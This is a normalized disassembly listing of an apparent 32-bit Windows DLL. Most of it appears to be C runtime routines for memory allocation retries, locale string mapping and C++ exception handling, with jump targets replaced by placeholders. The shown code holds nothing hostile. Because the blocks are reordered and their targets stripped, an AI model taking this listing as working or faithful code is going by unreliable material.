cmp ecx 0x9
jbe r-xdata
mov ecx [ ebp - 0x4 ]
pop ebx
cmp ecx [ ebp + 0x10 ]
jb r-xdata
mov [ esi ] 0x0
dec esi
mov [ edi ] 0x0
call sub_10017e85
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
mov eax [ ebp + 0x18 ]
mov dl [ eax ]
mov cl [ esi ]
mov [ esi ] dl
dec esi
mov [ eax ] cl
inc eax
mov [ ebp + 0x18 ] eax
cmp eax esi
jb r-xdata
xor eax eax
call sub_1001b8e4
mov eax esi
jmp r-xdata
sub_10019ddc
mov edi edi
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0x10 ]
push 0x0
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10019cf0
pop edi
pop ebp
retn
sub_10019dfb
mov edi edi
push ebp
mov ebp esp
push esi
push edi
xor esi esi
mov eax edi
pop edi
pop esi
pop ebp
retn
cmp [ rw-data ] eax
jbe r-xdata
push esi
call [ Sleep@IAT ]
lea eax [ esi + 0x3e8 ]
cmp eax [ rw-data ]
jbe r-xdata
mov esi eax
cmp eax 0xffffffff
jne r-xdata
or eax 0xffffffff
push [ ebp + 0x8 ]
call sub_10019b49
mov edi eax
pop ecx
test edi edi
jne r-xdata
sub_10019e40
mov edi edi
push ebp
mov ebp esp
push esi
push edi
xor esi esi
mov eax edi
pop edi
pop esi
pop ebp
retn
cmp [ rw-data ] eax
jbe r-xdata
push esi
call [ Sleep@IAT ]
lea eax [ esi + 0x3e8 ]
cmp eax [ rw-data ]
jbe r-xdata
mov esi eax
cmp eax 0xffffffff
jne r-xdata
or eax 0xffffffff
push 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10021c85
mov edi eax
add esp 0xc
test edi edi
jne r-xdata
sub_10019e8c
mov edi edi
push ebp
mov ebp esp
push esi
push edi
xor esi esi
mov eax edi
pop edi
pop esi
pop ebp
retn
cmp [ ebp + 0xc ] eax
je r-xdata
cmp [ rw-data ] eax
jbe r-xdata
push esi
call [ Sleep@IAT ]
lea eax [ esi + 0x3e8 ]
cmp eax [ rw-data ]
jbe r-xdata
mov esi eax
cmp eax 0xffffffff
jne r-xdata
or eax 0xffffffff
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10021d07
mov edi eax
pop ecx
pop ecx
test edi edi
jne r-xdata
sub_10019f03
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
pop ebp
retn
sub eax 0x8
cmp [ eax ] 0xdddd
jne r-xdata
push eax
call sub_1001750d
pop ecx
sub_10019f23
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov edx [ ebp + 0x18 ]
push ebx
xor ebx ebx
push esi
push edi
cmp edx ebx
jle r-xdata
mov [ ebp - 0x8 ] ebx
cmp [ ebp + 0x24 ] ebx
jne r-xdata
mov eax [ ebp + 0x14 ]
mov ecx edx
mov esi [ MultiByteToWideChar@IAT ]
xor eax eax
cmp [ ebp + 0x28 ] ebx
push ebx
push ebx
push [ ebp + 0x18 ]
setne al
push [ ebp + 0x14 ]
lea eax [ eax * 8 + 0x1 ]
push eax
push [ ebp + 0x24 ]
call esi
mov edi eax
mov [ ebp - 0x10 ] edi
cmp edi ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov eax [ eax + 0x4 ]
mov [ ebp + 0x24 ] eax
mov eax edx
sub eax ecx
dec eax
cmp eax edx
jge r-xdata
inc eax
cmp ecx ebx
jne r-xdata
jle r-xdata
xor eax eax
jmp r-xdata
mov [ ebp + 0x18 ] eax
inc eax
dec ecx
cmp [ eax ] bl
je r-xdata
or ecx 0xffffffff
mov [ ebp - 0xc ] ebx
push 0xffffffe0
xor edx edx
pop eax
div edi
cmp eax 0x2
jb r-xdata
lea esp [ ebp - 0x1c ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10016ec3
leave
retn
push edi
push [ ebp - 0xc ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push 0x1
push [ ebp + 0x24 ]
call esi
test eax eax
je r-xdata
lea eax [ edi + edi + 0x8 ]
cmp eax 0x400
ja r-xdata
push [ ebp - 0xc ]
call sub_10019f03
mov eax [ ebp - 0x8 ]
pop ecx
mov esi [ LCMapStringW@IAT ]
push ebx
push ebx
push edi
push [ ebp - 0xc ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call esi
mov [ ebp - 0x8 ] eax
cmp eax ebx
je r-xdata
push eax
call sub_10019b49
pop ecx
cmp eax ebx
je r-xdata
call sub_10021dc0
mov eax esp
cmp eax ebx
je r-xdata
mov ecx 0x400
test [ ebp + 0x10 ] ecx
je r-xdata
mov [ ebp - 0xc ] eax
jmp r-xdata
mov [ eax ] 0xdddd
mov [ eax ] 0xcccc
jmp r-xdata
mov edi [ ebp - 0x8 ]
cmp edi ebx
jle r-xdata
mov eax [ ebp + 0x20 ]
cmp eax ebx
je r-xdata
cmp [ ebp - 0xc ] ebx
je r-xdata
add eax 0x8
xor edi edi
push 0xffffffe0
xor edx edx
pop eax
div edi
cmp eax 0x2
jb r-xdata
cmp [ ebp - 0x8 ] eax
jg r-xdata
push [ ebp - 0x8 ]
push edi
push [ ebp - 0x10 ]
push [ ebp - 0xc ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call esi
test eax eax
je r-xdata
lea eax [ edi + edi + 0x8 ]
cmp eax ecx
ja r-xdata
push eax
push [ ebp + 0x1c ]
push edi
push [ ebp - 0xc ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call esi
jmp r-xdata
push edi
call sub_10019f03
pop ecx
push ebx
push ebx
cmp [ ebp + 0x20 ] ebx
jne r-xdata
push eax
call sub_10019b49
pop ecx
cmp eax ebx
je r-xdata
call sub_10021dc0
mov edi esp
cmp edi ebx
je r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push ebx
push ebx
jmp r-xdata
mov edi eax
jmp r-xdata
mov [ eax ] 0xdddd
add eax 0x8
mov [ edi ] 0xcccc
add edi 0x8
jmp r-xdata
push [ ebp - 0x8 ]
push edi
push ebx
push [ ebp + 0x24 ]
call [ WideCharToMultiByte@IAT ]
mov [ ebp - 0x8 ] eax
cmp edi ebx
je r-xdata
sub_1001a10a
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_100176e6
push [ ebp + 0x28 ]
lea eax [ ebp - 0x10 ]
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_10019f23
add esp 0x24
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_1001a150
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_100176e6
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xac ] 0x1
jle r-xdata
mov eax [ eax + 0xc8 ]
mov ecx [ ebp + 0x8 ]
movzx eax [ eax + ecx * 2 ]
and eax 0x4
lea eax [ ebp - 0x10 ]
push eax
push 0x4
push [ ebp + 0x8 ]
call sub_10021dec
add esp 0xc
jmp r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_1001a1a1
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push [ ebp + 0x8 ]
call sub_1001a150
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ecx [ rw-data ]
movzx eax [ ecx + eax * 2 ]
and eax 0x4
pop ebp
retn
sub_1001a1cf
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_100176e6
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xac ] 0x1
jle r-xdata
mov eax [ eax + 0xc8 ]
mov ecx [ ebp + 0x8 ]
movzx eax [ eax + ecx * 2 ]
and eax 0x8
lea eax [ ebp - 0x10 ]
push eax
push 0x8
push [ ebp + 0x8 ]
call sub_10021dec
add esp 0xc
jmp r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_1001a220
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push [ ebp + 0x8 ]
call sub_1001a1cf
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ecx [ rw-data ]
movzx eax [ ecx + eax * 2 ]
and eax 0x8
pop ebp
retn
sub_1001a259
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
mov [ esi ] r--data
call sub_10016fb6
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_100173b1
pop ecx
sub_1001a280
mov edi edi
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
xor eax eax
inc eax
lea edx [ eax + 0x8 ]
cmp [ edx ] 0x0
je r-xdata
mov esi [ ebp + 0xc ]
mov ecx [ esi + 0x4 ]
cmp eax ecx
je r-xdata
test [ esi ] 0x2
je r-xdata
add ecx 0x8
push ecx
push edx
call sub_1001b620
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ ebp + 0x10 ]
mov eax [ eax ]
test al 0x1
je r-xdata
test [ edi ] 0x8
je r-xdata
xor eax eax
jmp r-xdata
test al 0x2
je r-xdata
test [ edi ] 0x1
je r-xdata
pop edi
pop esi
pop ebp
retn
test [ edi ] 0x2
je r-xdata
sub_1001a2df
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov eax [ eax ]
cmp eax 0xe0434352
je r-xdata
call sub_1001c0b4
cmp [ eax + 0x90 ] 0x0
jle r-xdata
cmp eax 0xe0434f4d
je r-xdata
xor eax eax
pop ebp
retn
call sub_1001c0b4
dec [ eax + 0x90 ]
cmp eax 0xe06d7363
jne r-xdata
call sub_1001c0b4
and [ eax + 0x90 ] 0x0
jmp sub_1001e754
sub_1001a32e
push 0x10
push r--data
call sub_1001de70
mov edi [ ebp + 0x10 ]
mov ebx [ ebp + 0x8 ]
cmp [ edi + 0x4 ] 0x80
jg r-xdata
mov esi [ ebx + 0x8 ]
movsx esi [ ebx + 0x8 ]
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1001a3f0
cmp esi [ ebp + 0x14 ]
je r-xdata
cmp esi 0xffffffff
jle r-xdata
mov [ ebp - 0x1c ] esi
call sub_1001c0b4
inc [ eax + 0x90 ]
and [ ebp - 0x4 ] 0x0
mov [ ebx + 0x8 ] esi
call sub_1001deb5
retn
call sub_1001e7a0
call sub_1001e7a0
cmp esi [ edi + 0x4 ]
jl r-xdata
mov eax esi
mov ecx [ edi + 0x8 ]
mov esi [ ecx + eax * 8 ]
mov [ ebp - 0x20 ] esi
mov [ ebp - 0x4 ] 0x1
cmp [ ecx + eax * 8 + 0x4 ] 0x0
je r-xdata
and [ ebp - 0x4 ] 0x0
jmp r-xdata
mov [ ebx + 0x8 ] esi
push 0x103
push ebx
mov ecx [ edi + 0x8 ]
push [ ecx + eax * 8 + 0x4 ]
call sub_1001e7f0
mov [ ebp - 0x1c ] esi
jmp r-xdata
cmp esi [ ebp + 0x14 ]
je r-xdata
sub_1001a40a
mov eax [ eax ]
cmp [ eax ] 0xe06d7363
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x10 ] 0x3
jne r-xdata
mov ecx [ eax + 0x14 ]
cmp ecx 0x19930520
je r-xdata
cmp [ eax + 0x1c ] 0x0
jne r-xdata
cmp ecx 0x19930521
je r-xdata
call sub_1001c0b4
xor ecx ecx
inc ecx
mov [ eax + 0x20c ] ecx
mov eax ecx
retn
cmp ecx 0x19930522
jne r-xdata
sub_1001a44f
push 0x8
push r--data
call sub_1001de70
mov ecx [ ebp + 0x8 ]
test ecx ecx
je r-xdata
call sub_1001deb5
retn
cmp [ ecx ] 0xe06d7363
jne r-xdata
mov eax [ ecx + 0x1c ]
test eax eax
je r-xdata
mov eax [ eax + 0x4 ]
test eax eax
je r-xdata
and [ ebp - 0x4 ] 0x0
push eax
push [ ecx + 0x18 ]
call sub_10018753
mov [ ebp - 0x4 ] 0xfffffffe
sub_1001a4a4
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0xc ]
mov eax [ ecx ]
push esi
mov esi [ ebp + 0x8 ]
add eax esi
cmp [ ecx + 0x4 ] 0x0
jl r-xdata
pop esi
pop ebp
retn
mov edx [ ecx + 0x4 ]
mov ecx [ ecx + 0x8 ]
mov esi [ edx + esi ]
mov ecx [ esi + ecx ]
add ecx edx
add eax ecx
sub_1001a4de
mov edi edi
push ebp
mov ebp esp
xor eax eax
sub esp 0xc
cmp edi eax
jne r-xdata
mov [ ebp - 0x1 ] al
mov [ ebp - 0xc ] eax
cmp [ edi ] eax
jle r-xdata
call sub_1001e7a0
mov al [ ebp - 0x1 ]
leave
retn
push ebx
mov [ ebp - 0x8 ] eax
push esi
test ebx ebx
jg r-xdata
mov ecx [ ebp + 0x8 ]
push [ ecx + 0x1c ]
mov eax [ esi ]
push eax
mov eax [ edi + 0x4 ]
add eax [ ebp - 0x8 ]
push eax
call sub_1001a280
add esp 0xc
test eax eax
jne r-xdata
jmp r-xdata
mov [ ebp - 0x1 ] 0x1
dec ebx
add esi 0x4
inc [ ebp - 0xc ]
mov eax [ ebp - 0xc ]
add [ ebp - 0x8 ] 0x10
cmp eax [ edi ]
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x1c ]
mov eax [ eax + 0xc ]
mov ebx [ eax ]
lea esi [ eax + 0x4 ]
jmp r-xdata
pop esi
pop ebx
sub_1001a59d
push 0x2c
push r--data
call sub_1001de70
mov ebx ecx
mov edi [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x1c ] ebx
and [ ebp - 0x34 ] 0x0
mov eax [ edi - 0x4 ]
mov [ ebp - 0x24 ] eax
push [ esi + 0x18 ]
lea eax [ ebp - 0x3c ]
push eax
call sub_10018a00
pop ecx
pop ecx
mov [ ebp - 0x28 ] eax
call sub_1001c0b4
mov eax [ eax + 0x88 ]
mov [ ebp - 0x2c ] eax
call sub_1001c0b4
mov eax [ eax + 0x8c ]
mov [ ebp - 0x30 ] eax
call sub_1001c0b4
mov [ eax + 0x88 ] esi
call sub_1001c0b4
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x8c ] ecx
and [ ebp - 0x4 ] 0x0
xor eax eax
inc eax
mov [ ebp + 0x10 ] eax
mov [ ebp - 0x4 ] eax
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push ebx
push [ ebp + 0x14 ]
push edi
call sub_10018aa5
add esp 0x14
mov [ ebp - 0x1c ] eax
and [ ebp - 0x4 ] 0x0
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
mov [ ebp + 0x10 ] 0x0
call sub_1001a6c3
mov eax [ ebp - 0x1c ]
call sub_1001deb5
retn
sub_1001a636
mov esp [ ebp - 0x18 ]
call sub_1001c0b4
and [ eax + 0x20c ] 0x0
mov esi [ ebp + 0x14 ]
mov edi [ ebp + 0xc ]
cmp [ esi + 0x4 ] 0x80
jg r-xdata
mov ecx [ edi + 0x8 ]
movsx ecx [ edi + 0x8 ]
jmp r-xdata
push ecx
push esi
push 0x0
push edi
call sub_1001a32e
add esp 0x10
and [ ebp - 0x1c ] 0x0
and [ ebp - 0x4 ] 0x0
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0xfffffffe
mov [ ebp + 0x10 ] 0x0
call sub_1001a6c3
mov eax [ ebp - 0x1c ]
call sub_1001deb5
retn
imul eax eax 0x14
mov edx [ eax + ebx + 0x4 ]
cmp ecx edx
jle r-xdata
mov ebx [ esi + 0x10 ]
and [ ebp - 0x20 ] 0x0
inc [ ebp - 0x20 ]
jmp r-xdata
cmp ecx [ eax + ebx + 0x8 ]
jg r-xdata
mov eax [ ebp - 0x20 ]
cmp eax [ esi + 0xc ]
jae r-xdata
mov eax [ esi + 0x8 ]
mov ecx [ eax + edx * 8 + 0x8 ]
sub_1001a6c3
mov eax [ ebp - 0x24 ]
mov [ edi - 0x4 ] eax
push [ ebp - 0x28 ]
call sub_10018a53
pop ecx
call sub_1001c0b4
mov ecx [ ebp - 0x2c ]
mov [ eax + 0x88 ] ecx
call sub_1001c0b4
mov ecx [ ebp - 0x30 ]
mov [ eax + 0x8c ] ecx
cmp [ esi ] 0xe06d7363
jne r-xdata
retn
cmp [ esi + 0x10 ] 0x3
jne r-xdata
mov eax [ esi + 0x14 ]
cmp eax 0x19930520
je r-xdata
cmp [ ebp - 0x34 ] 0x0
jne r-xdata
cmp eax 0x19930521
je r-xdata
cmp [ ebp - 0x1c ] 0x0
je r-xdata
cmp eax 0x19930522
jne r-xdata
push [ esi + 0x18 ]
call sub_10018a2c
pop ecx
test eax eax
je r-xdata
push [ ebp + 0x10 ]
push esi
call sub_1001a44f
pop ecx
pop ecx
sub_1001a739
push 0xc
push r--data
call sub_1001de70
xor edx edx
mov [ ebp - 0x1c ] edx
mov eax [ ebp + 0x10 ]
mov ecx [ eax + 0x4 ]
cmp ecx edx
je r-xdata
xor eax eax
cmp [ ecx + 0x8 ] dl
je r-xdata
mov ecx [ eax + 0x8 ]
cmp ecx edx
jne r-xdata
mov eax [ eax ]
mov esi [ ebp + 0xc ]
test eax eax
js r-xdata
test [ eax ] 0x80000000
je r-xdata
mov [ ebp - 0x4 ] edx
xor ebx ebx
inc ebx
push ebx
test al 0x8
je r-xdata
lea esi [ ecx + esi + 0xc ]
mov edi [ ebp + 0x14 ]
mov eax [ ebp + 0x8 ]
push [ eax + 0x18 ]
test [ edi ] bl
je r-xdata
mov edi [ ebp + 0x8 ]
push [ edi + 0x18 ]
call sub_10021ea4
pop ecx
pop ecx
test eax eax
je r-xdata
cmp [ edi + 0x18 ] edx
jne r-xdata
call sub_10021ea4
pop ecx
pop ecx
test eax eax
je r-xdata
call sub_1001e7a0
push ebx
push esi
call sub_10021ea4
pop ecx
pop ecx
test eax eax
je r-xdata
call sub_10021ea4
pop ecx
pop ecx
test eax eax
je r-xdata
call sub_10021ea4
pop ecx
pop ecx
test eax eax
je r-xdata
push ebx
push esi
call sub_10021ea4
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ edi + 0x18 ]
mov [ esi ] eax
mov ecx [ ebp + 0x14 ]
add ecx 0x8
push ecx
push ebx
push esi
call sub_10021ea4
pop ecx
pop ecx
test eax eax
je r-xdata
push ebx
push esi
call sub_10021ea4
pop ecx
pop ecx
test eax eax
je r-xdata
push [ edi + 0x14 ]
mov eax [ ebp + 0x8 ]
push [ eax + 0x18 ]
push esi
call sub_10017050
add esp 0xc
cmp [ edi + 0x14 ] 0x4
jne r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
mov eax [ ebp - 0x1c ]
jmp r-xdata
push [ edi + 0x18 ]
call sub_10021ea4
pop ecx
test eax eax
je r-xdata
push [ edi + 0x14 ]
add edi 0x8
push edi
mov eax [ ebp + 0x8 ]
push [ eax + 0x18 ]
call sub_1001a4a4
pop ecx
pop ecx
push eax
push esi
call sub_10017050
add esp 0xc
jmp r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
call sub_1001deb5
retn
test [ edi ] 0x4
push 0x0
pop eax
setne al
inc eax
mov [ ebp - 0x1c ] eax
jmp r-xdata
add edi 0x8
push edi
jmp r-xdata
push eax
call sub_1001a4a4
pop ecx
pop ecx
mov [ esi ] eax
jmp r-xdata
sub_1001a8b8
push 0x8
push r--data
call sub_1001de70
mov eax [ ebp + 0x10 ]
test [ eax ] 0x80000000
je r-xdata
mov ecx [ eax + 0x8 ]
mov edx [ ebp + 0xc ]
lea ebx [ ecx + edx + 0xc ]
mov ebx [ ebp + 0xc ]
jmp r-xdata
lea eax [ esi + 0x8 ]
push eax
push [ edi + 0x18 ]
call sub_1001a4a4
pop ecx
pop ecx
push eax
push [ esi + 0x18 ]
push ebx
call sub_10018753
dec eax
jne r-xdata
and [ ebp - 0x4 ] 0x0
mov esi [ ebp + 0x14 ]
push esi
push eax
push [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
push edi
call sub_1001a739
add esp 0x10
dec eax
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1001deb5
retn
push 0x1
lea eax [ esi + 0x8 ]
push eax
push [ edi + 0x18 ]
call sub_1001a4a4
pop ecx
pop ecx
push eax
push [ esi + 0x18 ]
push ebx
call sub_10018753
jmp r-xdata
sub_1001a94a
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x18 ] 0x0
je r-xdata
cmp [ ebp + 0x20 ] 0x0
push [ ebp + 0x8 ]
jne r-xdata
push [ ebp + 0x18 ]
push ebx
push esi
push [ ebp + 0x8 ]
call sub_1001a8b8
add esp 0x10
push [ ebp + 0x20 ]
push esi
jmp r-xdata
pop ebp
retn
push esi
push eax
call sub_10018721
call sub_1001875a
push [ edi ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push esi
call sub_1001a32e
mov eax [ edi + 0x4 ]
push 0x100
push [ ebp + 0x1c ]
inc eax
push [ ebp + 0x14 ]
mov [ esi + 0x8 ] eax
push [ ebp + 0xc ]
mov ecx [ ebx + 0xc ]
push esi
push [ ebp + 0x8 ]
call sub_1001a59d
add esp 0x28
test eax eax
je r-xdata
sub_1001a9b8
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
push esi
mov esi [ ebp + 0x8 ]
cmp [ esi ] 0x80000003
je r-xdata
pop esi
leave
retn
push edi
call sub_1001c0b4
cmp [ eax + 0x80 ] 0x0
je r-xdata
mov edi [ ebp + 0x18 ]
cmp [ edi + 0xc ] 0x0
jne r-xdata
call sub_1001c0b4
lea edi [ eax + 0x80 ]
call sub_1001bf04
cmp [ edi ] eax
je r-xdata
mov esi [ ebp + 0x1c ]
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x4 ]
push eax
push esi
push [ ebp + 0x20 ]
push edi
call sub_1001898d
mov ecx [ ebp - 0x4 ]
add esp 0x14
cmp ecx [ ebp - 0xc ]
jae r-xdata
call sub_1001e7a0
mov eax [ esi ]
cmp eax 0xe0434f4d
je r-xdata
pop edi
add eax 0xc
mov [ ebp - 0x8 ] eax
push ebx
cmp eax 0xe0434352
je r-xdata
inc [ ebp - 0x4 ]
mov ecx [ ebp - 0x4 ]
add eax 0x14
mov [ ebp - 0x8 ] eax
cmp ecx [ ebp - 0xc ]
jb r-xdata
cmp esi [ eax - 0x8 ]
jg r-xdata
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call sub_10018817
add esp 0x1c
test eax eax
jne r-xdata
lea edi [ eax - 0xc ]
cmp esi [ edi ]
jl r-xdata
pop ebx
mov ecx [ eax ]
shl ecx 0x4
add ecx [ eax + 0x4 ]
mov edx [ ecx - 0xc ]
test edx edx
je r-xdata
lea ebx [ ecx - 0x10 ]
test [ ebx ] 0x40
jne r-xdata
cmp [ edx + 0x8 ] 0x0
jne r-xdata
push [ ebp + 0x24 ]
mov esi [ ebp + 0xc ]
push [ ebp + 0x20 ]
push 0x0
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0x8 ]
call sub_1001a94a
mov esi [ ebp + 0x1c ]
mov eax [ ebp - 0x8 ]
add esp 0x1c
sub_1001aabf
mov edi edi
push ebp
mov ebp esp
sub esp 0x34
mov ecx [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x18 ]
mov eax [ ebx + 0x4 ]
push esi
push edi
mov [ ebp - 0x1 ] 0x0
cmp eax 0x80
jg r-xdata
mov ecx [ ecx + 0x8 ]
movsx ecx [ ecx + 0x8 ]
jmp r-xdata
call sub_1001e7a0
cmp ecx eax
jl r-xdata
mov [ ebp - 0x8 ] ecx
cmp ecx 0xffffffff
jl r-xdata
mov esi [ ebp + 0x8 ]
mov edi 0xe06d7363
cmp [ esi ] edi
jne r-xdata
cmp [ ebx + 0xc ] 0x0
jbe r-xdata
cmp [ esi + 0x10 ] 0x3
mov ebx 0x19930520
jne r-xdata
call sub_1001c0b4
cmp [ eax + 0x94 ] 0x0
je r-xdata
cmp [ ebp + 0x1c ] 0x0
jne r-xdata
cmp [ esi ] edi
jne r-xdata
mov eax [ esi + 0x14 ]
cmp eax ebx
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
call sub_1001e7a0
call sub_1001e754
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp - 0x8 ]
push ebx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call sub_1001a9b8
add esp 0x20
mov ebx [ ebp + 0x18 ]
cmp [ esi + 0x10 ] 0x3
jne r-xdata
cmp [ esi + 0x1c ] 0x0
jne r-xdata
cmp eax 0x19930521
je r-xdata
mov eax [ esi + 0x14 ]
cmp eax ebx
je r-xdata
call sub_1001c0b4
cmp [ eax + 0x88 ] 0x0
je r-xdata
cmp eax 0x19930522
jne r-xdata
mov edi [ ebp + 0x18 ]
cmp [ edi + 0xc ] 0x0
jbe r-xdata
cmp eax 0x19930521
je r-xdata
call sub_1001c0b4
mov esi [ eax + 0x88 ]
mov [ ebp + 0x8 ] esi
call sub_1001c0b4
mov eax [ eax + 0x8c ]
push 0x1
push esi
mov [ ebp + 0x10 ] eax
call sub_10021ea4
pop ecx
pop ecx
test eax eax
jne r-xdata
cmp [ ebp + 0x1c ] 0x0
je r-xdata
lea eax [ ebp - 0x20 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
push [ ebp - 0x8 ]
push [ ebp + 0x20 ]
push edi
call sub_1001898d
mov ecx [ ebp - 0x10 ]
add esp 0x14
cmp ecx [ ebp - 0x20 ]
jae r-xdata
cmp eax 0x19930522
jne r-xdata
cmp [ esi ] edi
jne r-xdata
call sub_1001e7a0
cmp [ ebp - 0x1 ] 0x0
jne r-xdata
push 0x1
push esi
call sub_1001a44f
pop ecx
pop ecx
lea edi [ eax + 0x10 ]
mov [ ebp - 0x1c ] edi
call sub_1001c0b4
cmp [ eax + 0x94 ] 0x0
je r-xdata
cmp [ esi + 0x10 ] 0x3
jne r-xdata
mov eax [ edi ]
and eax 0x1fffffff
cmp eax 0x19930521
jb r-xdata
inc [ ebp - 0x10 ]
mov eax [ ebp - 0x10 ]
add edi 0x14
mov [ ebp - 0x1c ] edi
cmp eax [ ebp - 0x20 ]
jb r-xdata
cmp ecx [ edi - 0xc ]
jg r-xdata
call sub_1001c0b4
mov edi [ eax + 0x94 ]
call sub_1001c0b4
push [ ebp + 0x8 ]
xor esi esi
mov [ eax + 0x94 ] esi
call sub_1001a4de
pop ecx
test al al
jne r-xdata
mov eax [ esi + 0x14 ]
cmp eax ebx
je r-xdata
mov edi [ edi + 0x1c ]
test edi edi
je r-xdata
mov ecx [ ebp - 0x8 ]
lea eax [ edi - 0x10 ]
mov [ ebp - 0x28 ] eax
cmp [ eax ] ecx
jg r-xdata
mov edi [ ebp + 0x18 ]
mov eax [ edi ]
mov [ ebp - 0xc ] eax
mov eax [ edi - 0x4 ]
mov [ ebp - 0x18 ] eax
test eax eax
jle r-xdata
mov esi [ ebp + 0x8 ]
mov edi 0xe06d7363
xor ebx ebx
cmp [ edi ] ebx
jle r-xdata
cmp [ esi + 0x1c ] 0x0
jne r-xdata
cmp eax 0x19930521
je r-xdata
push esi
call sub_1001a4de
pop ecx
test al al
jne r-xdata
mov eax [ esi + 0x1c ]
mov eax [ eax + 0xc ]
lea ebx [ eax + 0x4 ]
mov eax [ eax ]
mov [ ebp - 0x14 ] eax
test eax eax
jle r-xdata
mov eax [ edi + 0x4 ]
mov ecx [ ebx + eax + 0x4 ]
push rw-data
call sub_100173ed
test al al
jne r-xdata
call sub_1001e7a0
cmp eax 0x19930522
jne r-xdata
call sub_1001c0b4
call sub_1001c0b4
call sub_1001c0b4
mov [ eax + 0x88 ] esi
call sub_1001c0b4
cmp [ ebp + 0x24 ] 0x0
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x8c ] ecx
push esi
jne r-xdata
dec [ ebp - 0x18 ]
add [ ebp - 0xc ] 0x10
cmp [ ebp - 0x18 ] 0x0
jg r-xdata
push [ esi + 0x1c ]
mov eax [ ebx ]
push eax
push [ ebp - 0xc ]
mov [ ebp - 0x24 ] eax
call sub_1001a280
add esp 0xc
test eax eax
jne r-xdata
push 0x1
push [ ebp + 0x8 ]
call sub_1001a44f
pop ecx
pop ecx
lea eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0x34 ]
mov [ ebp + 0x8 ] r--data
call sub_10016f5a
push r--data
lea eax [ ebp - 0x34 ]
push eax
mov [ ebp - 0x34 ] r--data
call sub_10017df7
inc esi
add ebx 0x10
cmp esi [ edi ]
jl r-xdata
push [ ebp + 0x24 ]
push [ ebp + 0xc ]
jmp r-xdata
